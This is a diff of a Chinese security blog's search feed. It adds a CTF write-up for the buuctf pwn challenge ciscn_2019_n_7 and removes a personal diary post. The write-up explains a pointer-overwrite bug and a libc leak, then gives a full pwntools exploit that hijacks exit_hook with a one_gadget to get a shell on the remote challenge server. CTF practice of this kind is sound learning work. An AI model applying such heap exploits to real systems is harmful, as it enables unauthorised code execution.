@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>buuctf刷题记录</title>
+      <link href="/2022/01/17/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
+      <url>/2022/01/17/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+      
+        <content type="html"><![CDATA[<p> 一切随缘啦~</p><h2 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h2><p>程序每次只能申请一个 chunk，有 edit ，没有 free </p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>chunk_array+2 处存有 content ，0x10 字节写入会覆盖掉 content</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  v1 = chunk_array;</span><br><span class="line">  *chunk_array = length;</span><br><span class="line">  v1[<span class="number">2</span>] = <span class="built_in">malloc</span>(length);</span><br><span class="line">  unk_202014 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Author name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, chunk_array + <span class="number">1</span>, <span class="number">0x10</span>uLL);<span class="comment">//</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now,you can edit your article.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在菜单中输入 666 能泄露 libc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_C50();</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">----------------------------------------</span><br><span class="line">    <span class="function">__int64 <span class="title">sub_C50</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> _printf_chk(<span class="number">1LL</span>, &amp;unk_10D4, &amp;<span class="built_in">puts</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>劫持 exit_hook ，写入 og 即可</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;26203&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;2.23/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">leng,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">n,c</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,n)</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"><span class="comment">#libcbase = int(p.recv(12),16) - (0x7f783029b5d0-0x7f783022c000) - 0xc0</span></span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;leak:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">exit_hook = libcbase + <span class="number">0x5f0040</span> + <span class="number">3848</span></span><br><span class="line">print(<span class="string">&quot;exit_hook:&quot;</span>+<span class="built_in">hex</span>(exit_hook))</span><br><span class="line">one = libcbase + <span class="number">0xf1147</span>  <span class="comment">#0x4525a 0xef9f4 0xf0897 0x45206 | 0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(exit_hook))</span><br><span class="line">edit(<span class="string">&#x27;name&#x27;</span>,p64(one))</span><br><span class="line">print(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">chunk_array 0x000000000202018</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 刷题 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>堆利用之largebin_attack</title>
       <link href="/2021/12/12/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Blargebin-attack/"/>
       <url>/2021/12/12/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Blargebin-attack/</url>
@@ -266,31 +291,6 @@
             <tag> PWN </tag>
             
             <tag> 堆 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>凡是过往，皆为序章</title>
-      <link href="/2021/10/30/%E5%87%A1%E6%98%AF%E8%BF%87%E5%BE%80%EF%BC%8C%E7%9A%86%E4%B8%BA%E5%BA%8F%E7%AB%A0/"/>
-      <url>/2021/10/30/%E5%87%A1%E6%98%AF%E8%BF%87%E5%BE%80%EF%BC%8C%E7%9A%86%E4%B8%BA%E5%BA%8F%E7%AB%A0/</url>
-      
-        <content type="html"><![CDATA[<p> 之前的 butterfly 主题太难用了，看到学长他们用的新主题，感觉很简约，所以就换了这个主题</p><p>一直没有更新博客是因为不会用 markdown ，当时啥都不懂，包括图片处理什么的，每次写博客都很麻烦，又不好意思请教别人，所以就都写在 OneNote 上了（不得不说能直接粘图片还有随时同步什么的是真的方便，微软打钱！），但是格式也是个很大的弊端，也没有支持代码的插入，虽然很方便，但是不好看。</p><p>和学长他们混熟了之后教会了我很多骚操作（学长们都是超人！！！），感觉自己这十几年一直在用老人机，现在会用了，以后会慢慢把文章挪过来的。</p><hr><p>总结一下过去吧，感觉整个大一下都挺摸鱼的，因为一些个人原因，都没怎么静下心来学网安，现在想想当时的自己挺不负责的，辜负了自己对网安的热爱，也辜负了以前的努力，不过那件事过去之后自己也成熟了很多，也算是一种经历吧。</p><p>暑假去旅了次游，也算是给自己一个缓冲期了，然后也一直在学，虽然知道过去丢下的都弥补不回了，但是也算是有所改变了，迷迷糊糊的进了 V&amp;N ，大二上开始陆陆续续打进一些比赛的线下，重心也慢慢开始偏向网安了，状态也逐渐变得和最开始一样了，每天都很充实，一切都在慢慢变好。</p><p>大二就要接管组长这一职了，是机遇也是挑战，希望能在堆堆和卓哥那多学点，和豪👴经营好整个组吧，也希望网安组能一直很好的走下去……</p><p>未完待续……</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 小日记 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 日记 </tag>
             
         </tags>
       
